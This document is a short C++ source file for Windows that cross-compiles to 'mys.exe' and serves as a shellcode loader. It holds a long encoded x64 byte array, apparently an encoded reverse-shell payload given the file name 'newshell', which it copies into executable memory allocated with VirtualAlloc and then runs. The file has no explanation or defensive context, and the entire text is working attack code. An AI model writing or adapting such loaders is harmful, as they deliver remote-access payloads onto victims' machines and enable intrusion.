//x86_64-w64-mingw32-gcc newshell.cpp -o mys.exe

//#include "stdafx.h"
#include "windows.h"

int main()
{
	
	unsigned char shellcode[] = 
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\x1a\xcd\x57\x7b\x93\xe4\xc9\x6b\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe6\x85\xd4\x9f\x63\x0c"
		"\x09\x6b\x1a\xcd\x16\x2a\xd2\xb4\x9b\x3a\x4c\x85\x66\xa9\xf6"
		"\xac\x42\x39\x7a\x85\xdc\x29\x8b\xac\x42\x39\x3a\x85\xdc\x09"
		"\xc3\xac\xc6\xdc\x50\x87\x1a\x4a\x5a\xac\xf8\xab\xb6\xf1\x36"
		"\x07\x91\xc8\xe9\x2a\xdb\x04\x5a\x3a\x92\x25\x2b\x86\x48\x8c"
		"\x06\x33\x18\xb6\xe9\xe0\x58\xf1\x1f\x7a\x43\x6f\x49\xe3\x1a"
		"\xcd\x57\x33\x16\x24\xbd\x0c\x52\xcc\x87\x2b\x18\xac\xd1\x2f"
		"\x91\x8d\x77\x32\x92\x34\x2a\x3d\x52\x32\x9e\x3a\x18\xd0\x41"
		"\x23\x1b\x1b\x1a\x4a\x5a\xac\xf8\xab\xb6\x8c\x96\xb2\x9e\xa5"
		"\xc8\xaa\x22\x2d\x22\x8a\xdf\xe7\x85\x4f\x12\x88\x6e\xaa\xe6"
		"\x3c\x91\x2f\x91\x8d\x73\x32\x92\x34\xaf\x2a\x91\xc1\x1f\x3f"
		"\x18\xa4\xd5\x22\x1b\x1d\x16\xf0\x97\x6c\x81\x6a\xca\x8c\x0f"
		"\x3a\xcb\xba\x90\x31\x5b\x95\x16\x22\xd2\xbe\x81\xe8\xf6\xed"
		"\x16\x29\x6c\x04\x91\x2a\x43\x97\x1f\xf0\x81\x0d\x9e\x94\xe5"
		"\x32\x0a\x32\x2d\x93\xba\x59\x45\xfe\x65\x7b\x93\xa5\x9f\x22"
		"\x93\x2b\x1f\xfa\x7f\x44\xc8\x6b\x1a\x84\xde\x9e\xda\x58\xcb"
		"\x6b\x3f\xec\x97\xd3\xe4\x2a\x88\x3f\x53\x44\xb3\x37\x1a\x15"
		"\x88\xd1\x56\xba\x71\x7c\x6c\x31\x85\xe2\xf0\xa5\x56\x7a\x93"
		"\xe4\x90\x2a\xa0\xe4\xd7\x10\x93\x1b\x1c\x3b\x4a\x80\x66\xb2"
		"\xde\xd5\x09\x23\xe5\x0d\x1f\xf2\x51\xac\x36\xab\x52\x44\x96"
		"\x3a\x29\x0e\xc6\xb4\xfa\x32\x82\x33\x1a\x23\xa3\x7b\x5b\x95"
		"\x1b\xf2\x71\xac\x40\x92\x5b\x77\xce\xde\xe7\x85\x36\xbe\x52"
		"\x4c\x93\x3b\x91\xe4\xc9\x22\xa2\xae\x3a\x1f\x93\xe4\xc9\x6b"
		"\x1a\x8c\x07\x3a\xc3\xac\x40\x89\x4d\x9a\x00\x36\xa2\x24\xa3"
		"\x66\x43\x8c\x07\x99\x6f\x82\x0e\x2f\x3e\x99\x56\x7a\xdb\x69"
		"\x8d\x4f\x02\x0b\x57\x13\xdb\x6d\x2f\x3d\x4a\x8c\x07\x3a\xc3"
		"\xa5\x99\x22\xe5\x0d\x16\x2b\xda\x1b\x01\x26\x93\x0c\x1b\xf2"
		"\x52\xa5\x73\x12\xd6\xf2\xd1\x84\x46\xac\xf8\xb9\x52\x32\x9d"
		"\xf0\x9d\xa5\x73\x63\x9d\xd0\x37\x84\x46\x5f\x39\xde\xb8\x9b"
		"\x16\xc1\x35\x71\x74\xf6\xe5\x18\x1f\xf8\x57\xcc\xf5\x6d\x66"
		"\xc7\xd7\x80\x73\x91\xcc\xd0\x5d\xde\x25\x14\xf9\xe4\x90\x2a"
		"\x93\x17\xa8\xae\x93\xe4\xc9\x6b";

	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

    return 0;
}
